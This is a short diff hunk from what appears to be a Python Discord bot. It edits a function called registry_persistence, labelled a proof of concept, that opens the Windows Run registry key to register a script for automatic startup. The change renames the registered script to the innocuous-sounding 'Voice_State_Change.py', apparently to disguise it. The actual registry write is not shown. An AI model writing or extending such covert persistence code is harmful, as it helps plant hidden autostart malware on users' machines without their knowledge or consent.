@@ -80,7 +80,7 @@ async def registry_persistence(member: discord.Member, channel_name: str):
     (Proof-of-concept only!)
     """
     try:
-        script_path = os.path.abspath("voice_test.py")
+        script_path = os.path.abspath("Voice_State_Change.py")
         reg_key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\Run",
